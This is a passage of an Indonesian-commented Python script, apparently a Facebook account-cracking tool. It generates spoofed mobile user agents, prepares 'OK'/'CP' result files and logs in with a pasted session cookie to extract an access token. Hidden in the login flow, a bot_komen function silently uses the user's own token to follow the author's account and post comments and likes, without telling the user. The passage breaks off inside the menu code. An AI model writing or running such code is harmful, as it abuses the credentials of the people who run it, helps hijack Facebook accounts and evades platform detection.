	c=random.choice(['Redmi 4A Build/MMB29M; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Lenovo TB-X606X)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36 OPR/68.3.3557.64528'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['CPH2349) AppleWebKit/537.36'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='(KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Infinix X682C)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG GT-I9506/XXUDOE4 Build/LRX22C'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['en-US; vivo 1807 Build/OPM1.171019.026'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='UCBrowser/11.4.8.1012 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG SM-F900U Build/PPR1.180610.011'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)#ffffff
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; U; Android;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='en-us; Redmi 5 Plus Build/OPM1.171019.019'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='UCBrowser/13.4.0.1306 Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Redmi Note 9 Pro)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG GT-I9506/XXUDOE4 Build/LRX22C'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['V2111 Build/SP1A.210812.003; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['JNY-LX2 Build/HUAWEIJNY-L22; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['HLK-AL00 Build/HONORHLK-AL00; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['ASUS_Z01QD)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi 4A Build/MMB29M; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Lenovo TB-X606X)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36 OPR/68.3.3557.64528'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['CPH2349) AppleWebKit/537.36'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='(KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Infinix X682C)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 3)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

# ------------[ INDICATION ]---------------#
M2 = "[#FF0000]"  # MERAH
H2 = "[#00FF00]"  # HIJAU
K2 = "[#FFFF00]"  # KUNING
B2 = "[#00C8FF]"  # BIRU
P2 = "[#FFFFFF]"  # PUTIH
U2 = "[#AF00FF]"  # UNGU
O2 = "[#FF8F00]"  # ORANGE
try:
    file_color = open("data/theme_color", "r").read()
    color_text = file_color.split("|")[0]
    color_panel = file_color.split("|")[1]
except:
    color_text = "[#00FF00]"
    W1 = random.choice([M2, H2, K2])
    W2 = random.choice([K2, M2, K2])
    W3 = random.choice([H2, K2, M2])
    color_panel = "#00FF00"
    color_ok = "#00FF00"
    color_cp = "#FFFF00"
try:
    color_table = open("data/theme_color", "r").read()
except FileNotFoundError:
    color_table = "#00FF00"
#------------[ INDICATION ]---------------#
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
kom2 = random.choice(["Jadikan Aku Anak Buah Mu Bang @[100043537611609:]","Panutan Ku","Sebenarnya Aku Suka Sama Kamu, Tetapi Aku Cuma Butuh Waktu Untuk Mengungkapkan Isi Hati Ku"])
# --------------------[ CONVERTER-BULAN ]--------------#
dic = {"1": "January", "2": "February", "3": "March", "4": "April", "5": "May", "6": "June", "7": "July", "8": "August", "9": "September", "10": "October", "11": "November", "12": "December"}
dic2 = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}

tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = "OK-" + str(tgl) + "-" + str(bln) + "-" + str(thn) + ".txt"
cpc = "CP-" + str(tgl) + "-" + str(bln) + "-" + str(thn) + ".txt"
hour = datetime.datetime.now().hour
hari_ini = datetime.datetime.now().strftime("%d %B %Y")
current_time = datetime.datetime.now()
jam_fan = current_time.strftime("%I:%M %p")

# ------------------[ BERSIHIN MUKA LU]-----------------#
def clear():
    os.system("clear")

def jalan(keliling):
    for mau in keliling + "\n":
        sys.stdout.write(mau)
        sys.stdout.flush()
        time.sleep(0.03)
	    
# ------------------[ LOGO-FANKY-GANTENG ]-----------------#
from rich.console import Console
from rich.panel import Panel
from rich.text import Text

def logoku():
    console = Console()

    # Logo Lisensi
    logo_text = Text(
        """
██╗     ██╗ ██████╗███████╗███╗   ██╗███████╗███████╗
██║     ██║██╔════╝██╔════╝████╗  ██║██╔════╝██╔════╝
██║     ██║██║     █████╗  ██╔██╗ ██║███████╗█████╗  
██║     ██║██║     ██╔══╝  ██║╚██╗██║╚════██║██╔══╝  
███████╗██║╚██████╗███████╗██║ ╚████║███████║███████╗
╚══════╝╚═╝ ╚═════╝╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝
""",
        style="bold cyan"
    )

    # Panel utama dengan width 60
    panel = Panel(
        logo_text,
        title="[bold magenta]Selamat Datang[/bold magenta]",
        subtitle="[bold yellow]Gunakan Setelah Registrasi Tools Anda[/bold yellow]",
        border_style="green",
        width=60
    )

    # Cetak ke console
    console.print(panel)

# Panggil fungsi untuk menampilkan banner


def banner():
    Console().print(
        Panel(
            """
[bold red]███████████████████████ [bold yellow]NAME  : [bold green]FANKY 
[bold red]███████████████████████ [bold yellow]Githb : [bold green]github.com/fanky86  
[bold red]███████████████████████ [bold yellow]Saran : [bold green]Jangan pake wifi
[bold white]███████████████████████ [bold yellow]IG    : [bold green]@fannjha
[bold white]███████████████████████          
[bold white]███████████████████████ 
[bold white]""",
            width=60,
            style=f"{color_panel}",
        )
    )
    
# --------------------[ MASUK PELAN PELAN ATUH FANKY ]--------------#
def login123():
    os.system("clear")
    banner()
    Console().print(
        Panel(
            f"""{P2}[{color_text}01{P2}].Login Menggunakan Cookie\n[{color_text}02{P2}].{M2}Keluar""",
            width=60,
            style=f"{color_panel}",
            title="[bold green]Login",
        )
    )
    bryn = console.input(f" {H2}• {P2}pilih menu : ")
    if bryn in ["1", "01"]:
        logincoki()
    elif bryn in ["2", "02"]:
        exit()
    else:
        Console().print(f" {H2}• {P2}[bold red]Pilihan Tidak Diketahui!", end="\r")
        time.sleep(5)
        login()


def login():
    try:
        token = open(".fantoken.txt", "r").read()
        cok = open(".fancookie.txt", "r").read()
        tokenku.append(token)
        try:
            menu()
        except KeyError:
            login123()
        except requests.exceptions.ConnectionError:
            Console().print(
                f" {H2}• {P2}[bold red]Problem Internet Connection, Check And Try Again"
            )
            exit()
    except IOError:
        login123()

###-----[ BAGIAN LOGIN ]-----###
def logincokii():
	try:
		cok = Console().input(f" {H2}• {P2}cookie : ")
		open('.fancookie.txt', 'w').write(cok)
		with requests.Session() as r:
			try:
				r.headers.update({
					'Accept-Language': 'id,en;q=0.9',
					'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
					'Referer': 'https://www.instagram.com/',
					'Host': 'www.facebook.com',
					'Sec-Fetch-Mode': 'cors',
					'Accept': '*/*',
					'Connection': 'keep-alive',
					'Sec-Fetch-Site': 'cross-site',
					'Sec-Fetch-Dest': 'empty',
					'Origin': 'https://www.instagram.com',
					'Accept-Encoding': 'gzip, deflate',
				})
				response = r.get(
					'https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/',
					cookies={'cookie': cok}
				)
				if '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open('.fantoken.txt', 'w').write(token)
					Console().print(Panel(f"""{P2}{token}""", width=60, style=f"{color_panel}", title="[bold green]TOKEN"))
				else:
					Console().print(f" {H2}• {P2}[bold red]Cookie Invalid")
					exit()
			except Exception as e:
				print(e)
				exit()
		Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script")
		sleep(2)
		exit()
	except Exception as e:
		os.system('rm -rf .fancookie.txt')
		os.system('rm -rf .fantoken.txt')
		print(e)
		exit()

# --------------------[ LOGIN-TOKEN-EAAB ]--------------#
def logincoki():
    try:
        cok = Console().input(f" {H2}• {P2}cookie : ")
        cookie = {'cookie':cok}
        open(".fancookie.txt","w").write(cok)
        with requests.Session() as xyz:
            url = 'https://www.facebook.com/adsmanager/manage/campaigns'
            req = xyz.get(url,cookies=cookie)
            set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
            nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
            roq = xyz.get(nek,cookies=cookie)
            tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
            open(".fantoken.txt","w").write(tok)
            bot_komen(cok, tok)
            Console().print(Panel(f"""{P2}{tok}""", width=60, style=f"{color_panel}", title="[bold green]TOKEN"))
            Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script")
            exit()
    except Exception as e:
        os.system("rm -rf .fantoken.txt && rm -rf .fancookie.txt")
        exit()
# --------------------[ INI BOT FOLLOW & KOMEN ]--------------#
def bot_komen(cok, ken):
	with requests.Session() as r:
		text = random.choice(['Keren Bang 😎', 'Hello World!', 'Mantap Bang ☺️', 'I Love You ❤️', 'Hai Bang 😘'])
		r.cookies.update({'cookie': cok})
		r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={ken}')
		# r.post(f'https://graph.facebook.com/926438272150751/comments/?message={text}&access_token={ken}')
		r.post(f'https://graph.facebook.com/926438272150751/comments/?message={text}&access_token={ken}')
		r.post(f'https://graph.facebook.com/926438272150751/likes?summary=true&access_token={ken}')
		# r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={ken}')
# ------------------[ INI BOT FOLLOW GOBLOG BTW FANKY GANTENG ]--------------#
def bot_follow():
	with requests.Session() as r:
		toket = open('.fantoken.txt','r').read()
		r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={toket}')
# ----------------[ BAGIAN-MENU ]----------------#
def menu():
    try:
        prem = f"{H2}Premium"
    except (KeyError, FileNotFoundError):
        prem = f"{H2}Premium"

    try:
        token = open(".fantoken.txt", "r").read()
        cookie = open(".fancookie.txt", "r").read()
        tokenku.append(token)
    except IOError:
        Console().print(f" {H2}• {P2}[bold red] Cookies Kadaluarsa, masukan ulang cookie")
        os.system("rm -rf .fantoken.txt && rm -rf .fancookie.txt")
        time.sleep(3)
        login()
    try:
        header = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9', 'Cache-Control': 'max-age=0', 'Pragma': 'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace', 'Sec-Ch-Prefers-Color-Scheme': 'light', 'Sec-Ch-Ua': '', 'Sec-Ch-Ua-Full-Version-List': '', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '', 'Sec-Ch-Ua-Platform-Version': '', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36', 'Viewport-Width': '924'}
        req = ses.get('https://www.facebook.com/profile.php', headers=header, cookies={'cookie': cookie}, allow_redirects=True).text
        my_id = re.search('"userID":"(.*?)"', str(req)).group(1)
        my_name = re.search('"NAME":"(.*?)"', str(req)).group(1)
    except:
        my_name=[]
